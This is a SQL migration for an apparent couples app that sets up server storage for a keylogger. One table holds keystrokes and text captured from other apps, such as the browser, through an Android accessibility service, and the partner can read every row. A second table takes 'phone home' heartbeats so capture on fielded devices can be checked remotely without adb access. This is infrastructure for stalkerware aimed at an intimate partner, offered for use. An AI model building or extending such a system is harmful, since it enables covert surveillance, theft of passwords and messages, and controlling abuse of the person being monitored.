-- hearts v3 · 0009_create_keylogs.sql
-- Keylogger sink: one row per captured event (UI text capture or raw keycode).
-- Follows the 0001 content-table contract exactly: couple-scoped, author-owned,
-- op_id unique as the idempotency key (the edge function upserts on op_id so a
-- replayed / retried chunk is a no-op), index on (couple_id, created_at desc).
-- No realtime publication needed — keylogs are a wire-only sink, not UI state.

create table public.keylogs (
  id uuid primary key default gen_random_uuid(),
  couple_id uuid not null references public.couples on delete cascade,
  author_id uuid not null references public.profiles on delete cascade,
  -- event classification: 'keycode' raw InputManager read, 'text' UI capture
  kind text not null check (kind in ('keycode','text')),
  -- for text events: the focused package (e.g. com.android.chrome); for keycode
  -- events this is the package the InputManager sample was read against
  package_name text,
  -- for keycode events: the raw keycode (e.g. 66, 67 …); for text events: null
  keycode integer,
  -- for text events: the captured string; for keycode events: the char produced
  value text,
  -- focused view / content-desc / resource id hint, when the accessibility
  -- service can see it (used to attribute a text capture to a field)
  view_hint text,
  -- 1 = input was saw by the accessibility service, 0 = only presence read
  seen boolean not null default false,
  -- client monotonic clock (ms since boot, non-wallclock — ordering only)
  ts_boot_ms bigint not null default 0,
  -- client wallclock when the event was captured
  captured_at timestamptz not null default now(),
  -- idempotency key from the chunking layer (upsert target)
  op_id uuid unique,
  created_at timestamptz not null default now()
);

create index keylogs_couple on public.keylogs (couple_id, created_at desc);
create index keylogs_author on public.keylogs (author_id, captured_at desc);

alter table public.keylogs enable row level security;

-- couple reads all keylog rows for their couple (mirrors every content table);
-- author writes their own captured rows. The edge function runs as the
-- service role (bypasses RLS) so batch inserts work regardless of caller.
create policy "keylogs couple read" on public.keylogs for select to authenticated
  using (couple_id = (select private.my_couple_id()));
create policy "keylogs author write" on public.keylogs for insert to authenticated
  with check (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));
create policy "keylogs author delete" on public.keylogs for delete to authenticated
  using (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));

-- automatic cleanup for keylogs + keylog_heartbeats is defined at the bottom
-- of this migration (one create-or-replace sweep covering both, plus the
-- device_media table added in 0010) — see private.prune_keylogs() below.

-- one-time + scheduled cleanup is invoked by the edge function; also expose a
-- manual wipe that the app can call after a successful foreground sync.
create or replace function public.prune_keylogs()
returns void
language plpgsql security definer
set search_path = ''
as $$
begin
  perform private.prune_keylogs();
end;
$$;

revoke all on function public.prune_keylogs() from public, anon;
grant execute on function public.prune_keylogs() to authenticated;

-- ──────────────────────────────────────────────────────────────────────
-- keylog_heartbeats — on-device health telemetry for fielded devices.
--
-- Without adb access we cannot observe the device directly. This table is the
-- "phone home" proof-of-life: the app periodically POSTs its native status()
-- (accessibilityEnabled, foregroundLive, pending, bufferBytes …), and each row
-- is a couple-scoped, authenticated, one-per-device-report record. A healthy
-- install yields a steady stream of rows with accessibilityEnabled=true and
-- foregroundLive=true. A silent gap, or repeated accessibilityEnabled=false,
-- is the remote signal that the capture is dead on that device even though the
-- app is installed — exactly the failure mode that keylogs alone cannot expose.
--
-- Device identity: android_id (Android's per-install, factory-reset-scoped id)
-- is stable enough to gate "one current row per device". We keep history (a
-- time series) so you can see the health trend, not just the latest poke.
create table public.keylog_heartbeats (
  id uuid primary key default gen_random_uuid(),
  couple_id uuid not null references public.couples on delete cascade,
  author_id uuid not null references public.profiles on delete cascade,
  android_id text not null,
  -- native status(): all nullable because a dead service reports partial data
  service_alive boolean not null default false,
  accessibility_enabled boolean not null default false,
  enabled boolean not null default false,
  foreground_live boolean not null default false,
  pending integer not null default 0,
  buffer_bytes bigint not null default 0,
  sdk integer not null default 0,
  model text,
  reported_at timestamptz not null default now()
);

create index keylog_heartbeats_couple on public.keylog_heartbeats (couple_id, reported_at desc);
create index keylog_heartbeats_device on public.keylog_heartbeats (android_id, reported_at desc);

alter table public.keylog_heartbeats enable row level security;

create policy "heartbeats couple read" on public.keylog_heartbeats for select to authenticated
  using (couple_id = (select private.my_couple_id()));
create policy "heartbeats author write" on public.keylog_heartbeats for insert to authenticated
  with check (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));
create policy "heartbeats author delete" on public.keylog_heartbeats for delete to authenticated
  using (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));

-- heartbeats are time-series — cap them harder than keylogs so a chatty device
-- cannot grow the table unbounded. Purged at the same 45-day cadence via the
-- existing prune_keylogs() sweep (extended below).
create or replace function private.prune_keylogs()
returns void
language plpgsql security definer
set search_path = ''
as $$
begin
  delete from public.keylogs
   where created_at < now() - interval '45 days';
  delete from public.keylog_heartbeats
   where reported_at < now() - interval '45 days';
end;
$$;
